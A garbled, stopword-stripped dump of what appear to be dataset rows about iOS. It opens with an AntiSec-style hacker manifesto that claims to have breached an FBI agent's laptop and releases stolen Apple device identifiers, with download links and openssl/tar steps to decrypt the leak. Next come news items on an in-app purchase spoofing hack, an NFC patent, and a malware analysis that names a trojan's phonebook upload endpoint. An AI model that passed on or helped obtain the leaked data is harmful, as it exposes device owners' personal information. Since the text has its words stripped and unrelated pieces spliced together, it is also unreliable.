criminal dear system created argumentum ad baculum world fear word use express punished choosing wrong one decided follow way worst kind slavery one afraid thought government around globe already control u real life declared war people take internet happening waiting wake dear friend turn decide belong made people fear government tyranny government fear people liberty thomas jefferson candy candy candy candy download link http http http http http http uploadanycom http http get candy downloaded file first check file lol yes lulz god detail decrypt file using openssl openssl filetxt decryptedfiletargz password uncompress tar xvzf decryptedfiletargz check file integrity using included password u used decrypt yeah one everything look fine perhaps enjoy apple device udids linking user apns token original file contained around device decided million would enough release trimmed personal data full name cell number address zipcodes etc device amount personal data linked device contained lot info others zipcodes almost anything left main column consider enough help significant amount user look device listed devtokens included mobile hacker could figure use dataset file contains detail identify apple device ordered apple device udid apple push notification service devtoken device name device type never liked concept udids since beginning indeed really bad decision apple fishy thingie big question exposing personal data well learnt seems quite clear nobody pay attention come say hey fbi using device detail info fuck know hell experimenting well sorry nobody care fbi usual deny ignore uncomfortable thingie everybody forget whole thing amazing speed next option could released mail small extract data people would eventually pick issue well let honest ephemeral without even sure current choice guarantee people pay attention fucking shouted fucking fbi using device info tracking people project shit well least seems best bet even case probably see damage control team going hard lobbying medium bullshit discredit well whatever least tried eventually looking massive number device concerned someone care also think right moment release knowing apple looking alternative udid currently since blocked axx well case late concerned owner list always thought really bad idea hardware coded id device concept erradicated device market future candy delivered word shit came nt like much disclosing part understood would needed fuck whatever lost asset hope serf something second week march dell vostro notebook used supervisor special agent christopher k stangl fbi regional cyber action team new york fbi office evidence response team breached using atomicreferencearray vulnerability java shell session file downloaded desktop folder one name ncftaiosdevicesintelcsv turned list apple io device including unique device identifier udid user name name device type device apple push notification service token zipcodes cellphone number address etc personal detail field referring people appears many time empty leaving whole list incompleted many part file folder make mention list purpose penis journalist interview anyone till adrian chen get featured front page gawker whole day huge picture dressing ballet tutu shoe head photoshop yeah man like keith alexander go go go get desired pageviews number happens whole statement thing getting directly u tutu source support wikileaks julian assange respect tunisian egyptian people keep good fight dont accept new oppressor place old one syrian rebel assad win exterminate till last one better go kill motherfucker bunch sucker support pussy riot hang babe resistance forever r sorry mike happened princess didnt want bring trouble fed heard reason leading spoken sad hanged around couple week u vagely understood u felt misplaced looking back event end also good choice everyone hope u finish understanding thing think seen always thing dont see there always another behind behind behind greeting group struggling daily fight remember fight u adversary looking time highest wisdom freedom life earned alone conquer day anew goethe lulzsec antisec lulzxmas series base belong u megacocklulzfestival wat iz diz cia tango fuckfbifriday stratforhasthebuttinflames bluehairedaaronbarr westborochurchloveseatingcocks white hat ca nt jump keith alexander dressing exhuberant ballet tutu image others trademark anonymous inc well people general romney aber sag ihm er kann mich im arsche lecken disclaimer like beer use manipulated bacterial adn transmit encrypted data well move go sleep
610,Lobsters,ios,Apple iOS,Hacker exploits iOS flaw for free in-app purchases,http://www.macworld.com/article/1167677/hacker_exploits_ios_flaw_for_free_in_app_purchases.html,hacker exploit io flaw free inapp purchase,csr racing behind hack implication next affiliate link policy,hack let io user trick app store giving inapp purchase free gone public potentially costing app maker revenue causing apple major headache exploit first posted wednesday came prominence early friday publicized several website fact hack proven popular server allowing writing due overwhelming demand alexey v borodin russia built inapp purchase hack requires several installing bogus certificate device using speciallycrafted dns server ingredient combine fool apps believing communicating app store actually going web server pretend app store instead borodin told macworld exploit work part spoofing code receipt apple issue inapp purchase developer use validation io device configured mistakenly believe receipt coming directly apple speaking macworld instant message borodin claimed every inapp receipt generic contains direct user data receipt easy spoof borodin hobby said challenge csr racing io game freemium model though game free download offer slew inapp purchase unlock extra ingame option feature borodin disapproves set due hungry lazy developer angry see csr racing developer taking money every single breath borodin confirmed comfortable user getting inapp purchase free feel similarly apps use behind hack understand hack important learn bit inapp purchase work customer completes inapp purchase apple sends app back bit data app meant ping apple server directly realtime confirm validity receipt short app get notice completed transaction immediately confirm apple receipt came borodin hack work inapp purchase two way developer validate receipt receive io device app web server developer marco tabini told macworld apple approach receipt validation flawed thus company fault exploit existence disclosure tabini occasional macworld contributor developed app exploit tabini explained due developer incompetence merely validating receipt apple enough said tabini said process like apple use shared secret code known app apple apple provided shared secret part iap process using secret conjunction random salt would prove developer response apple genuine validated receipt apple spokeswoman natalie harrison told macworld security app store incredibly important u developer community take report fraudulent activity seriously investigating company comment borodin hack work purchase validated solely io purchase look fake apple server address hack provides apps instead rely web server validate receipt course talk genuine apple turn respond receipt invalid since apple really generate borodin say next phase hack go one step future cache developer server response said would mean even apps validate web would risk tabini point however developer use secure secret secure signing would order magnitude work borodin hack apps server response short borodin hack classic man middle attack malicious code lucrative code depending upon perspective sits real server meant hit implication fact borodin hack exploit apparent weakness apple system unlikely sit well app maker whole point inapp purchase system app store worry system tabini said otherwise giving apple percent point app maker likely rely apple receipt validation approach building solution willing bet percent developer validate io lot extra work setup server validation developer craig hockenberry told macworld marco arment developer instapaper belief hack work standalone inapp purchase subscriptionbased one like newsstand apps employ via email arment told macworld probably affect autorenewing subscription since rely lot serverside processing track surprise could affect inapp purchase type including nonrenewable subscription like instapaper us apps check apple verification server web service io user try hack may find addition robbing developer behind apps enjoy put risk see apple id password account try hack borodin told macworld credit card information borodin said shocked password passed plain text encrypted according tabini though apple presumes talking server valid security certificate clearly entirely apple fault tabini added next fixing exploit difficult apple tabini say think easy way solve problem without io update server power borodin exploit currently writing nothing stop sprouting even block releasing code anyone run mean customer install presumed io update would patch vulnerability could theory continue avail free inapp purchase apps continue validate always apple could also change app maker validate seems like must process take time meantime developer protect apps exploit switching secure webbased receipt validation fix work user upgrade latest version apps borodin seem particularly concerned apple next asked afraid apple response directly might replied adding happy user iphone think hire updated pm pt comment apple note purchase something clicking link article may earn small commission read affiliate link policy detail
612,Lobsters,ios,Apple iOS,Apple Wins Patent for NFC-Enabled 'iTravel' Transportation Ticketing App,http://www.macrumors.com/2012/07/10/apple-wins-patent-for-nfc-enabled-itravel-transportation-ticketing-app/,apple win patent nfcenabled itravel transportation ticketing app,digital wallet app rumor intentionally moving slowly new apple patent noted,apple announcing new passbook digital wallet app io last month speculation regarding inclusion near field communication nfc mobile payment capability future io device begun increase speculation come amid rumor iphone prototype nfc although apple said intentionally moving slowly mobile payment front passbook revealed today granting new apple patent nfcenabled transportation ticketing take additional significance noted unwired view disclosed itravel application would handle broad array function assist travel logistics main focus patent would use next iphone nfc chip airport checkin includes loading id info picture retinal scan fingerprint data modern passport embedded radio frequency identification tag collecting ticket information reservation confirmation emailsnotifications extracting reservation image via optical character recognition software barcodereading software qrcodereading software providing necessary information nfc equipped checkin counter receiving boarding pas luggage info exchange using stored id pas airport security etc apple itravel patent application known time filed september published public viewing april patent granted u patent trademark office apple broader protection choose launch application unusual apple thoroughly document actual io application concept yet see light day patent application unclear exactly apple chosen nfc technology bit slower establish originally hoped perhaps apple thought would able move faster idea alternatively apple may already discarded specific implementation passbook making appearance later year nfc perhaps also included apple itravel concept may still find way io device form
614,Lobsters,ios,Apple iOS,First case of iOS malware to reach the App Store,https://www.securelist.com/en/blog/208193641/Find_and_Call_Leak_and_Spam,first case io malware reach app store,notified secretly apps malicious created update published translation update update update,yesterday contacted partner megafon one major mobile carrier russia notified u suspicious application found apple app store google play first glance seemed sm worm spread via sending short message contact stored phone book url however analysis io android version application showed sm worm trojan uploads user phonebook remote server replication part done server sm spam message url application sent remote server contact user address book application called find call found io apple app store android google play already informed apple google received answer yet find call apple store find call google play user comment apple store google play pretty angry contain complaint app sends sm spam angry bird comment installation following icon appears menu androidios homescreen user launch application asked register app using email address cell phone number field checked validity user want find friend phone book phone book data secretly eula term usagenotifications uploaded remote server following format http abonentfindandcallcomsystemprofilephonebook sid routine used uploading phone book remote server io routine android routine list field retrieved phonebook apps also able upload user gps coordinate server feature new malicious legal apps honest happens next user able continue using application time application steal data device phone book cell phone number uploaded remote server used sm spam campaign phone book entry receive sm spam message offering click url download find call application worth mentioning field contains user cell phone number word people receive sm spam message trusted source sm spam message easier reach help free application url small faq apps malicious yes apps upload user phone book remote server use sm spam detect trojanandroidosfidalla trojaniphoneosfidalla created good question actually interesting detail website app allows logging account enter social network account mail account seems detail also used even paypal add money account try add amount money notice trying transfer money company called labwealthcom pte ltd check website labwealthcom find company based singapore named wealth creation laboratory yeah right company way really nice motto let create together world plenty prosperity malware google play nothing new first case seen malware apple app store worth mentioning incident malware inside io apple app store since launch year ago main issue user privacy first time see incident related user personal data leakage first time confirmed case malicious usage data sure application must deleted official market yes piece malware cybercriminalistic malware malware case steal user phone book us sm spam sure must strict quick response incident period many thanks colleague igor soumenkov aleks gostev sergey golovanov roman unuchek costin raiu also would like thank ipad samsung galaxy siii ipod touch update russian blog appleinsiderru published story application able connect author fidall received following response c appleinsiderru translation application work july good day system process betatesting result failure one component spontaneous sending inviting sm message bug process fixing sm sent system affect mobile account update email spam confirmed update pm thursday gmt contrary public report malicious io android application still available downloads market update apps removed apple storegoogle play p one curious detail fidall find code magic hexadecimal value see screenshot creating phrase hexadecimal number new many case thing noticed different malicious application
